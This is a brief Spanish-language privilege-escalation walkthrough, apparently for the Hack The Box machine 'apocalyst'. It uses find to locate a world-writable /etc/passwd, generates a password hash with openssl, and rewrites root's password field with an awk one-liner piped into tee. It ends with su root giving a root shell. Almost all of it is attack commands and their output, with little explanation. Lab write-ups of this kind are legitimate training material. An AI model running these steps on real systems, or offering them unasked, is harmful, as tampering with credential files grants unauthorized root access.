

# IDENTIFICAR SI PODEMOS EDITARLO
### ENUMERAR LOS PERMISOS SOBRE EL ARCHIVO
```shell
find / -writable -ls 2>/dev/null | grep -vE "/var|/run|/dev|/tmp|/lib|/proc|/sys"
37330      4 -rw-rw-rw-   1 root     root         1637 Jul 26  2017 /etc/passwd
```


# MODIFICACIÓN DEL ARCHIVO
### CREAR CONTRASEÑA PARA EL USUARIO ROOT
```shell
www-data@apocalyst:/$ openssl passwd
Password: admin
zXMknIfn598us
```

### MODIFICAR CONTRASEÑA PARA EL USUARIO ROOT
```shell
awk -F: 'BEGIN{OFS=":"} $1=="root"{$2="zXMknIfn598us"} 1' /etc/passwd | tee /etc/passwd
www-data@apocalyst:/var/www/html/apocalyst.htb$ su root
root@apocalyst:/var/www/html/apocalyst.htb#
```